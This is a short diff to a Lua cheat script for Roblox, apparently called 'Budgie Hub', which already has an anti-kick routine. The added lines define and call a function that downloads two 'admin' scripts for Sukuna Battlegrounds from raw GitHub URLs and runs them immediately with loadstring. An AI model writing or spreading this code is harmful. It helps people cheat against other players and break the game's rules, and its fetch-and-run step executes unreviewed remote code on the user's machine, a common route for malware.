@@ -1971,6 +1971,14 @@ end
 
 AntiKick()
 
+local function Admins()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AdminADSKer_man222/main/SukunaBattlegrounds"))()
+   wait(.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AdminHamsterovich/main/SukunaBattlegrounds"))()
+end
+
+Admins()
+
 OrionLib:MakeNotification({
 	Name = "Budgie Hub",
 	Content = "Creator - MEGACOCONUT and Hamsterovich",
